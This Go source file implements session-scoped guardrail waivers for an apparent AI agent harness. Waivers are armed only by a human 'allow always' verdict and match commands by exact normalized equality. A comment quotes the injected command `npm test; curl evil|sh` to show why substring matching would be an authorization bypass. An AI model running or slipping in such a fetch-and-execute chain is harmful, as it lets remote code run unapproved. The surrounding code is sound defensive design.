package modelhook

import (
	"strings"
	"sync"
)

// waiver.go is the session-scoped guardrail WAIVER (ADR 0062, sub-decision A): the
// "Allow & don't ask again" half of the out-of-band approve-once flow. Unlike the
// removed ADR-0061 OverrideArmer — which armed from a PARSED prompt directive — a
// waiver is armed ONLY from a genuine HUMAN verdict (session.VerdictAllowAlways on a
// hook-originated permission ask), routed through the engine's optional
// port.HookApprovalLearner.
//
// Matching is by NORMALIZED EXACT EQUALITY, never substring (CWE-863): a substring
// match on a stored `npm test` would auto-allow `npm test; curl evil|sh`, an
// authorization-escalation bypass. A waiver is ALWAYS a concrete per-call key (tool +
// normalized command for Shell, tool + normalized args for any other tool) — it is
// NEVER a blanket per-tool bypass.
//
// In-memory only: a waiver does NOT survive a process restart (the SAFE direction —
// a stale waiver never silently outlives the run, the same posture as the
// permstore-rehydrate wart). Session-keying gives child isolation for free (the
// Runner is wired only into the MAIN engine; a child session id never matches).

// waiverScope is the concrete key a session waiver authorizes. It matches by
// NORMALIZED EXACT EQUALITY — never substring. Both fields are always set when armed
// from a verdict (the holder never arms a partial/blanket scope), so a waiver is
// ALWAYS a concrete per-call key, never a per-tool bypass.
type waiverScope struct {
	// Tool is the exact tool name the verdict approved (always set).
	Tool string
	// Key is the NORMALIZED authorization key: for Shell, the normalized command; for
	// any other tool, the normalized raw args JSON. A waiver authorizes a candidate iff
	// tool AND normalize(candidate key) EXACTLY equal this (no substring, no blanket).
	Key string
}

// normalizeWaiverKey trims and collapses internal whitespace runs to a single space so
// cosmetically-different but semantically-identical commands/args compare equal, while
// keeping the comparison EXACT (no substring). It is the SINGLE normalization used at
// BOTH arm and match time so the two cannot drift.
func normalizeWaiverKey(s string) string {
	return strings.Join(strings.Fields(s), " ")
}

// matches reports whether this waiver authorizes a candidate (tool, key). It requires
// an EXACT tool-name match AND an EXACT normalized-key match. There is NO empty-key
// "matches any call" semantics — a non-Shell waiver matches only the exact same args,
// and a Shell waiver only the exact same command.
func (s waiverScope) matches(tool, key string) bool {
	return s.Tool == tool && s.Key == normalizeWaiverKey(key)
}

// WaiverHolder is the concurrency-safe, session-keyed holder of "Allow & don't ask
// again" guardrail waivers (ADR 0062). The composition constructs ONE shared holder,
// passes it into every Runner, and the engine arms it (via the Runner's
// HookApprovalLearner implementation) on an AllowAlways verdict for a hook-originated
// ask. A session may hold MULTIPLE waivers (one per distinct approved tool+key), so an
// operator who waives `gh pr merge 7` and later `gh pr merge 8` keeps both. A nil
// *WaiverHolder is safe — ArmFromApproval is a no-op and Allows returns false (the
// byte-identical no-waiver posture).
type WaiverHolder struct {
	mu     sync.Mutex
	waived map[string][]waiverScope
}

// NewWaiverHolder constructs an empty holder.
func NewWaiverHolder() *WaiverHolder {
	return &WaiverHolder{waived: make(map[string][]waiverScope)}
}

// arm records a waiver scope for sessionID (idempotent: an identical scope is not
// duplicated, so repeated AllowAlways verdicts on the same call don't grow the
// slice). A nil receiver is a no-op.
func (h *WaiverHolder) arm(sessionID string, scope waiverScope) {
	if h == nil {
		return
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	if h.waived == nil {
		h.waived = make(map[string][]waiverScope)
	}
	for _, existing := range h.waived[sessionID] {
		if existing == scope {
			return // already waived
		}
	}
	h.waived[sessionID] = append(h.waived[sessionID], scope)
}

// ArmFromApproval arms a waiver for sessionID from an approved call's (tool, key). It
// is the SINGLE arming entry the Runner's LearnHookApproval calls: tool is always set
// (a concrete approved call), and key is the call's concrete authorization key (the
// Shell command, or the raw args JSON for any other tool) — NORMALIZED before storage
// so it compares exactly against a normalized candidate. A nil receiver is a no-op.
func (h *WaiverHolder) ArmFromApproval(sessionID, tool, key string) {
	h.arm(sessionID, waiverScope{Tool: tool, Key: normalizeWaiverKey(key)})
}

// Allows reports whether an armed waiver for sessionID authorizes a candidate
// (tool, key) by NORMALIZED EXACT EQUALITY. Unlike the old one-shot Consume, a waiver
// is PERSISTENT for the session ("don't ask AGAIN"): it is NOT cleared on a hit — it
// keeps allowing the exact same call for the rest of the session. A nil receiver
// returns false.
func (h *WaiverHolder) Allows(sessionID, tool, key string) bool {
	if h == nil {
		return false
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	for _, scope := range h.waived[sessionID] {
		if scope.matches(tool, key) {
			return true
		}
	}
	return false
}
